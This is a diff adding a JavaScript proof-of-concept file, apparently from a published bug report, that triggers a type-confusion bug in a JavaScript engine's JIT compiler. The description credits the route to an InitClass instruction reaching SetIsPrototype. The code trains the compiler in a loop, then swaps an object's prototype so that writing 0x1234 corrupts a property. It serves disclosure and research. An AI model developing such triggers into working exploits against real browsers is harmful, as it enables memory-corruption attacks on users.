@@ -1,0 +1,36 @@
+/*
+
+Issue description
+
+This is similar to  issue 1702 (https://www.exploit-db.com/exploits/46203) . This time, it uses an InitClass instruction to reach the SetIsPrototype method.
+
+PoC:
+*/
+
+function opt(o, c, value) {
+    o.b = 1;
+
+    class A extends c {
+
+    }
+
+    o.a = value;
+}
+
+function main() {
+    for (let i = 0; i < 2000; i++) {
+        let o = {a: 1, b: 2};
+        opt(o, (function () {}), {});
+    }
+
+    let o = {a: 1, b: 2};
+    let cons = function () {};
+
+    cons.prototype = o;
+
+    opt(o, cons, 0x1234);
+
+    print(o.a);
+}
+
+main();
